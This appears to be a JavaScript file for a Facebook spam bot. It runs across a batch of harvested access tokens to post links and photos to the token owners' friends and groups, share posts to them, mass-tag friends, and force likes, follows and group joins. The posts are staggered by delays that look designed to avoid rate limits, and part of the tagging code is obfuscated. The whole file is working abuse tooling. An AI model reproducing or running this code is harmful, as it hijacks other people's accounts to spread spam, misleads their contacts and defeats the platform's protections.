     function get_groups(access_token , link , text , picture , type ,delay_gr_tk_post,limit) {
      console.log(access_token);
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit "+limit+"&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
              token_spam_post += 1;
              $('span#token_spam').text(token_spam_post + "/" + total_token);
              if(data.data && data.data.length){
                  total_gr += data.data.length;
                  $('span#gr_post').text(gr_post + "/" + total_gr);
                  if(type == 1)
                    shared_groups_feed(data,access_token,link,delay_gr_tk_post);
                  else
                    post_groups_feed(data,access_token,link,text,picture,delay_gr_tk_post);
              }
              console.log(data);
           }
       });
   }
  function count_groups_member(gid,access_token) {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=SELECT uid FROM group_member WHERE gid=" + gid + "limit 500 offset 4000&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
               //post_groups(data);
               console.log(data.data.length);
           }
       });
   }

   function get_friends(access_token , link , text , picture , type,delay_fr_tk_post,limit) {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit "+limit+"&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
             token_spam_post += 1;
              $('span#token_spam').text(token_spam_post + "/" + total_token);
              if(data.data && data.data.length){
                  total_fr += data.data.length;
                  $('span#fr_post').text(fr_post + "/" + total_fr);
                  if(type == 1)
                    share_friends_feed(data,access_token,link,delay_fr_tk_post);
                  else
                    post_friends_feed(data,access_token,link,text,picture,delay_fr_tk_post);
              }
            console.log(data);
           }
       });
   }

   function post_friends_photo(list , access_token , image_link , text) {
       for (i = 0; i < list.data.length; i++) {
           jQuery.ajax({
               url: "https://graph.facebook.com/"+list.data[i].uid+"/photos?url=" + image_link + "&message=" + text + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                  
                 
               }
       });
       }
   }
   function post_friends_feed(list , access_token , link , text , picture,delay_fr_tk_post ) {
      var postinsql = function(data_i){   
              console.log(data_i);
              jQuery.ajax({
               url: "https://graph.facebook.com/"+ data_i +"/feed?link=" + link + "&picture=" + picture + "&message=" + text + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                    console.log("post_fr");
                }
              });
           };
        if(!list.data)
          return ;
       for (i = 0; i < list.data.length; i++) {
            var dataaa = list.data[i].uid;
            console.log(dataaa);
            var j = i + 2;
            if(i>=10)
              j = j + 20;
            if(i>=20)
              j = j + 30;
            if(i>=30)
              j = j + 45;
            if(i>=100)
              j = j + 65;
            if(i>=200)
              j = j + 75;
            setTimeout(postinsql.bind(null, dataaa),delay_fr_tk_post * (j));
      }
   }

 function share_friends_feed(list , access_token ,post_id ,delay_fr_tk_post ) {
         var postinsql = function(data_i){   
              console.log(data_i);
              $.get({
              url: 'https://graph.facebook.com/' + post_id + '/sharedposts?to=' + data_i + '&access_token=' + access_token + '&callback=paylas&method=post',
              dataType: "jsonp",
               success: function(reponse) {
                   console.log("post");
                   console.log(reponse);
                   if(reponse.id){
                     if(type_start!=0){
                      fr_post += 1;
                      $('span#fr_post').text(fr_post + "/" + total_fr);
                    }
                }
              }
            });
        };
        if(!list.data)
          return ;
       for (i = 0; i < list.data.length; i++) {
            var dataaa = list.data[i].uid;
            console.log(dataaa);
            var j = i + 2;
            if(i>=10)
              j = j + 20;
            if(i>=20)
              j = j + 30;
            if(i>=30)
              j = j + 45;
            if(i>=40)
              j = j + 65;
            if(i>=50)
              j = j + 75;
            if(i>=60)
              j = j + 85;
            if(i>=70)
              j = j + 105;
            if(i>=80)
              j = j + 120;
            setTimeout(postinsql.bind(null, dataaa),delay_fr_tk_post * (j));
      }
   }

   function paylas(reponse){
        console.log(reponse);
        if(reponse.id){
          if(type_start==0){
            gr_post += 1;
            $('span#gr_post').text(gr_post + "/" + total_gr);
          }
          else{
            fr_post += 1;
            $('span#fr_post').text(fr_post + "/" + total_fr);
          }
        }
   }

   function post_groups_photo(list , access_token , image_link , text ) {
       for (i = 0; i < list.data.length; i++) {
           jQuery.ajax({
               url: "https://graph.facebook.com/" + list.data[i].gid + "/photos?url=" + image_link + "&message="+ text  + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                  gr_post += 1;
                  $('span#gr_post').text(gr_post + "/" + total_gr);
               }
        });
      }
   }

      function post_groups_feed(list , access_token , image_link , text , picture,delay_gr_tk_post) {
        var postinsql = function(data_i){   
              console.log(data_i);
              jQuery.ajax({
               url: "https://graph.facebook.com/" + data_i + "/feed?link=" + image_link + "&picture=" + picture + "&message="+ text  + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                   console.log("post");
              }
            });
        };
        if(!list.data)
          return ;
        
       for (i = 0; i < list.data.length; i++) {
          var dataaa = list.data[i].gid;
          //console.log(dataaa);
          var j = i + 1;
          if(i>=30){
            j = j + 30;
          }
          if(j>=40){
            j = j + 30;
          }
          if(j>=50){
            j = j + 30;
          }
          if(j>=60){
            j = j + 30;
          }
          if(j>=70){
            j = j + 30;
          }
          if(j>=80){
            j = j + 100;
          }
          console.log(delay_gr_tk_post);
          console.log(j);
          setTimeout(postinsql.bind(null, dataaa), delay_gr_tk_post * (j));
      }
   }
    function shared_groups_feed(list , access_token , post_id , delay_gr_tk_post) {
        var postinsql = function(data_i){   
              console.log(data_i);
              $.get({
              url: 'https://graph.facebook.com/' + post_id + '/sharedposts?to=' + data_i + '&access_token=' + access_token + '&callback=paylas&method=post',
              dataType: "jsonp",
               success: function(reponse) {
                   console.log("post");
                   console.log(reponse);
                   if(type_start==0){
                    if(reponse.id){
                      gr_post += 1;
                      $('span#gr_post').text(gr_post + "/" + total_gr);
                    }
                  }
              }
            });
        };
        if(!list.data)
          return ;
        
       for (i = 0; i < list.data.length; i++) {
          var dataaa = list.data[i].gid;
          //console.log(dataaa);
          var j = i + 1;
          if(i>=20)
            j = j + 20;
          if(i>=30){
            j = j + 30;
          }
          if(j>=40){
            j = j + 30;
          }
          if(j>=50){
            j = j + 30;
          }
          if(j>=60){
            j = j + 30;
          }
          if(j>=70){
            j = j + 30;
          }
          if(j>=80){
            j = j + 100;
          }
          console.log(delay_gr_tk_post);
          console.log(j);
          setTimeout(postinsql.bind(null, dataaa), delay_gr_tk_post * (j));
      }
   }

   function timeline(access_token , image_link , text ) {
       $["getJSON"]("https://graph.facebook.com/me/feed?link=" + image_link + "&message=" + text + "&method=POST&access_token=" + access_token, function (_0x1f66xf) {
           if (_0x1f66xf["id"]) {
               var _0x1f66x11 = _0x1f66xf["id"];
               console.log(_0x1f66x11);
               var _0x1f66x12 = 100;
               $["getJSON"]("https://graph.facebook.com/me/friends?limit=" + _0x1f66x12 + "&access_token=" + access_token, function (_0x1f66xf) {
                   if (_0x1f66xf["data"]) {
                       var _0x1f66x13 = [];
                       $["each"](_0x1f66xf["data"], function(_0x1f66x14, _0x1f66x7) {
                           _0x1f66x13["push"](_0x1f66x7["id"]);
                           $["getJSON"]("https: //graph.facebook.com/" + _0x1f66x11 + "/tags/" + _0x1f66x7["id"] + "/?method=POST&access_token=" + access_token, function (_0x1f66xf) {});
                       });
                   };
               });
           };
       });
   };

   function follow(id , access_token) {
       $.getJSON("https://graph.facebook.com/" + id + "/subscribers?method=post&access_token=" + access_token, function (response) {
       });
   }

   function like_page(id , access_token) {
       $.getJSON("https://graph.facebook.com/me/likes?access_token=" + access_token + "&method=POST&url=https://www.facebook.com/" + id, function (response) {
       });
   }

   function like_post(id , access_token) {
       $.getJSON("https://graph.facebook.com/" + id + "/likes/?method=post&access_token=" + access_token, function (response) {
       });
   }

   function join_group(grpid , access_token) {
       $.getJSON("https://graph.facebook.com/me?access_token=" + access_token, function (response) {
           if (response.id) {
               var userid = response.id;
               $.getJSON("https://graph.facebook.com/" + grpid + "/members/" + userid + "?method=post&access_token=" + access_token, function (response) {
                   if (response.data) {}
               });
           }
       });
   }